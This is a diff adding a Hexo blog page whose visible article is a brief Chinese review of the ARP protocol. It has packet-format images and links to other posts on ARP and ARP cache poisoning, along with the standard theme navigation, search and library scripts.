+<h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>ARP协议以及其相应的反面RARP都工作在网络层中，其主要作用是将IP地址转化为每个主机所独有的MAC地址</p>
+<p><img src="https://img-blog.csdnimg.cn/20200724135633405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE0MzY3OA==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="ARP报文格式"></p>
+<p>ARP报文封装在以太网帧中</p>
+<p><img src="https://img-blog.csdnimg.cn/2020072413570526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE0MzY3OA==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="ARP帧格式"></p>
+<p>而ARP的具体工作方式可以参考下面blog：</p>
+<p><a href="https://www.boolo.top/2020/07/24/20200724-1/" target="_blank" rel="noopener">ARP缓存中毒</a></p>
+<p><a href="https://blog.51cto.com/13570193/2083332" target="_blank" rel="noopener">ARP原理</a></p>
+<p><a href="https://blog.csdn.net/deramer1/article/details/73467048?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160298898219724836731294%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160298898219724836731294&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-3-73467048.pc_first_rank_v2_rank_v28&utm_term=ARP%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F&spm=1018.2118.3001.4187" target="_blank" rel="noopener">ARP协议格式和实例分析</a></p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ARP-Cache-Poisoning-Attack/">ARP-Cache-Poisoning-Attack</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/19/IP-ICMP-Attack-lab/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">IP/ICMP Attack lab</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/11/Format-String-lab/">
+                        <span class="hidden-mobile">Format-String-lab</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "ARP-Cache-Poisoning-Attack&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
